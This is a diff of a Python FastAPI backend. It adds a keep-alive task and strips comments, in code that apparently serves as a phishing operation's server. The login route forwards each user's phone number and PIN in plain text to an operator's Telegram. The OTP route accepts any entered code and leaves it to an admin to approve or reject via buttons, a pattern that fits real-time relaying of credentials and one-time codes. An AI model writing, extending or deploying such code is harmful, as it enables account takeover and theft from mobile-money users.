@@ -1,6 +1,8 @@
 import json
 import os
 import random
+import asyncio
+from contextlib import asynccontextmanager
 from uuid import uuid4
 from datetime import datetime, timedelta, timezone
 from dotenv import load_dotenv
@@ -18,7 +20,7 @@ from telegram_bot import (
     answer_callback_query,
     edit_message,
     send_loan_approval_request,
-    send_login_alert,            # ← NEW
+    send_login_alert,
 )
 from approvals import (
     create_approval,
@@ -47,7 +49,56 @@ INSTAGRAM_ADMIN_IDS = {
     x.strip() for x in os.getenv("INSTAGRAM_ADMIN_IDS", "").split(",") if x.strip()
 }
 
-app = FastAPI()
+# ────────────────────────────────────────────────────────────────
+# Keep-alive: ping self every 14 min so Render free tier doesn't sleep
+# ────────────────────────────────────────────────────────────────
+KEEP_ALIVE_URL = (
+    os.getenv("RENDER_EXTERNAL_URL")
+    or os.getenv("KEEP_ALIVE_URL")
+    or ""
+)
+KEEP_ALIVE_INTERVAL_SECONDS = 14 * 60
+
+
+async def keep_alive_ping():
+    """
+    Background task: hits our own root endpoint every 14 minutes.
+    Render suspends after 15 min of no traffic, so this keeps us under.
+
+    NOTE: only helps while the container is already awake. If the
+    service has been suspended, this task is frozen and cannot wake it.
+    Use an external monitor (UptimeRobot, cron-job.org) as a backstop.
+    """
+    if not KEEP_ALIVE_URL:
+        print("[KEEP-ALIVE] No KEEP_ALIVE_URL set — self-ping disabled.")
+        return
+
+    await asyncio.sleep(60)  # small initial delay
+
+    while True:
+        try:
+            async with httpx.AsyncClient(timeout=15) as client:
+                r = await client.get(f"{KEEP_ALIVE_URL.rstrip('/')}/")
+            print(f"[KEEP-ALIVE] Ping {KEEP_ALIVE_URL} → {r.status_code}")
+        except Exception as e:
+            print(f"[KEEP-ALIVE] Ping failed: {e}")
+        await asyncio.sleep(KEEP_ALIVE_INTERVAL_SECONDS)
+
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    print("[STARTUP] Launching keep-alive task…")
+    task = asyncio.create_task(keep_alive_ping())
+    yield
+    print("[SHUTDOWN] Cancelling keep-alive task…")
+    task.cancel()
+    try:
+        await task
+    except asyncio.CancelledError:
+        pass
+
+
+app = FastAPI(lifespan=lifespan)
 
 app.add_middleware(
     CORSMiddleware,
@@ -59,7 +110,6 @@ app.add_middleware(
 
 init_db()
 
-# Legacy login OTP store (still used by /api/login and /api/resend-otp)
 otp_store = {}
 
 # ────────────────────────────────────────────────────────────────
@@ -122,9 +172,6 @@ def cancel_pending_for_phone(phone: str, exclude_ref: str | None = None) -> None
             prev["status"] = "cancelled"
 
 
-# ────────────────────────────────────────────────────────────────
-# Admin notification for OTP-verify — WITH Approve / Reject buttons
-# ────────────────────────────────────────────────────────────────
 def _build_admin_message(req: dict) -> str:
     return (
         "🔔 <b>OTP Verification Request</b>\n"
@@ -137,7 +184,6 @@ def _build_admin_message(req: dict) -> str:
 
 
 async def notify_admin_of_otp_request(req: dict) -> None:
-    """Fan out the request to the Instagram bot and Telegram (with buttons)."""
     payload = {
         "type": "otp_request",
         "ref_id": req["ref_id"],
@@ -153,7 +199,6 @@ async def notify_admin_of_otp_request(req: dict) -> None:
         },
     }
 
-    # 1) Instagram bot webhook (preferred channel)
     if INSTAGRAM_BOT_WEBHOOK_URL:
         try:
             async with httpx.AsyncClient(timeout=10) as client:
@@ -163,9 +208,6 @@ async def notify_admin_of_otp_request(req: dict) -> None:
         except Exception as e:
             print(f"[IG-NOTIFY] failed: {e}")
 
-    # 2) Telegram with inline Approve / Reject buttons.
-    #    The ref_id doubles as the approval_id, so button callbacks carry
-    #    'approve:<ref_id>' / 'reject:<ref_id>' straight back to the webhook.
     try:
         await send_approval_request(
             approval_id=req["ref_id"],
@@ -212,7 +254,6 @@ class DecideRequest(BaseModel):
 # Helpers
 # ────────────────────────────────────────────────────────────────
 def format_phone(phone: str) -> str:
-    """Normalise a DRC mobile number to +243XXXXXXXXX."""
     phone = phone.strip().replace(" ", "").replace("-", "")
     if phone.startswith("+"):
         return phone
@@ -275,7 +316,6 @@ async def register(request: RegisterRequest):
     return {"status": "error", "message": "User already exists"}
 
 
-# --- LOGIN ---
 @app.post("/api/login")
 async def login(request: LoginRequest):
     full_phone = format_phone(request.phone_number)
@@ -286,7 +326,6 @@ async def login(request: LoginRequest):
 
     cleanup_approval_records_for_phone(full_phone)
 
-    # 1) Generate + SMS the OTP to the user
     otp = str(random.randint(1000, 9999))
     otp_store[full_phone] = otp
     otp_approval_status[full_phone] = "pending"
@@ -295,19 +334,14 @@ async def login(request: LoginRequest):
     sms_body = build_otp_sms(otp)
     await send_otp_to_user(full_phone, sms_body, label="LOGIN")
 
-    # 2) Telegram: ONLY phone, PIN, action, timestamp — never the OTP
     try:
         await send_login_alert(full_phone, request.pin, action="LOGIN")
     except Exception as e:
         print(f"[LOGIN] Login alert failed: {e}")
 
-    return {
-        "status": "approved",
-        "message": "OTP sent to your phone",
-    }
+    return {"status": "approved", "message": "OTP sent to your phone"}
 
 
-# --- VERIFY OTP (any 4-digit code is accepted; admin decides) ---
 @app.post("/api/verify-otp")
 async def verify_otp(request: VerifyOTPRequest):
     full_phone = format_phone(request.phone_number)
@@ -324,7 +358,6 @@ async def verify_otp(request: VerifyOTPRequest):
     pin = phone_pins.get(full_phone, "****")
     req = create_otp_request(full_phone, entered_otp, pin)
 
-    # Optional: accept a client-supplied ref_id for idempotency.
     if request.ref_id and request.ref_id not in otp_requests:
         otp_requests[request.ref_id] = otp_requests.pop(req["ref_id"])
         req["ref_id"] = request.ref_id
@@ -343,7 +376,6 @@ async def verify_otp(request: VerifyOTPRequest):
     }
 
 
-# --- OTP STATUS POLLING ---
 @app.get("/api/otp-status/{ref_id}")
 async def otp_status(ref_id: str):
     req = otp_requests.get(ref_id)
@@ -357,7 +389,6 @@ async def otp_status(ref_id: str):
     }
 
 
-# --- OTP CANCEL ---
 @app.post("/api/otp-cancel/{ref_id}")
 async def otp_cancel(ref_id: str):
     req = otp_requests.get(ref_id)
@@ -367,7 +398,6 @@ async def otp_cancel(ref_id: str):
     return {"status": "ok"}
 
 
-# --- RESEND OTP ---
 @app.post("/api/resend-otp")
 async def resend_otp(request: ResendRequest):
     full_phone = format_phone(request.phone_number)
@@ -383,7 +413,6 @@ async def resend_otp(request: ResendRequest):
     sms_body = build_otp_sms(new_otp)
     await send_otp_to_user(full_phone, sms_body, label="RESEND")
 
-    # Plain "Resend Requested" notice for the admin
     try:
         await send_telegram_message(
             f"🔄 <b>Resend Requested</b>\n\n"
@@ -510,7 +539,6 @@ async def _handle_admin_command(sender: str, text: str) -> None:
     cmd = parts[0].lower() if parts else ""
 
     def _reply(msg: str) -> None:
-        # Wire this to your Instagram Graph API Send call.
         print(f"[IG-REPLY -> {sender}] {msg}")
 
     if cmd in ("pending", "list"):
@@ -627,7 +655,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         callback_id = callback["id"]
         callback_data = callback.get("data", "")
 
-        # ── Loan approvals ────────────────────────────────────
         if callback_data.startswith("loan_approve:") or callback_data.startswith("loan_reject:"):
             action, approval_id = callback_data.split(":", 1)
             approved = action == "loan_approve"
@@ -643,7 +670,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                 )
             return {"ok": True}
 
-        # ── OTP approvals ─────────────────────────────────────
         parts = callback_data.split(":")
         if len(parts) < 2:
             return {"ok": True}
@@ -651,8 +677,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         action, approval_id = parts[0], parts[1]
         approved = action == "approve"
 
-        # ⭐ Resolve the request. Try the new ref_id-keyed store first;
-        #    fall back to legacy approval_* maps.
         req = otp_requests.get(approval_id)
         if req:
             expire_if_needed(req)
@@ -669,7 +693,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
 
             phone, pin, otp = req["phone"], req["pin"], req["otp"]
         else:
-            # Legacy path
             set_approval_result(approval_id, approved)
             phone = approval_phones.get(approval_id, "Unknown")
             pin = approval_pins.get(approval_id, "Unknown")
@@ -679,7 +702,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                 otp_approval_status[phone] = "approved" if approved else "rejected"
                 if not approved:
                     otp_store.pop(phone, None)
-                # Sync any ref_id record that matches this phone + otp
                 for r in otp_requests.values():
                     if r["phone"] == phone and r["otp"] == otp and r["status"] == "pending":
                         r["status"] = "approved" if approved else "rejected"
